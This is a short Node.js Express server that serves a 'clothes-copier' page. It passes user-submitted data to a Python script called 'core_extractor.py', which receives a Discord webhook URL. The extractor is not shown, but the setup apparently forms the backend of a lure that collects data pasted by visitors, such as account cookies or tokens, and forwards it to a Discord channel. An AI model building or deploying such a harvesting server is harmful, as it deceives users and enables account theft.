const express = require('express');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

app.use(express.static(path.join(__dirname, 'public')));

app.get('/clothes-copier', (req, res) => {
    const targetFile = 'clothes-copier.html';
    const filePath = path.join(__dirname, 'public', targetFile);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send('Clothes copier page not found.');
    }
});

app.get('/', (req, res) => {
    res.redirect('/clothes-copier');
});

app.post('/api/process', (req, res) => {
    const { data } = req.body;
    if (!data) {
        return res.status(400).json({ success: false, error: "Missing data payload" });
    }

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
        return res.status(500).json({ success: false, error: "Webhook not configured on server" });
    }

    const pyProcess = spawn('python3', ['core_extractor.py'], {
        env: { ...process.env, DISCORD_WEBHOOK_URL: webhookUrl }
    });

    let stdoutData = '';
    let stderrData = '';

    pyProcess.stdout.on('data', (chunk) => {
        stdoutData += chunk;
    });

    pyProcess.stderr.on('data', (chunk) => {
        stderrData += chunk;
    });

    pyProcess.on('close', (code) => {
        if (code !== 0) {
            return res.status(500).json({ success: false, error: "Extractor execution failed.", details: stderrData || `Exit code ${code}` });
        }
        res.json({ success: true, output: stdoutData });
    });

    // Send the payload safely through stdin
    pyProcess.stdin.write(data);
    pyProcess.stdin.end();
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] Server running on port ${PORT}`);
});
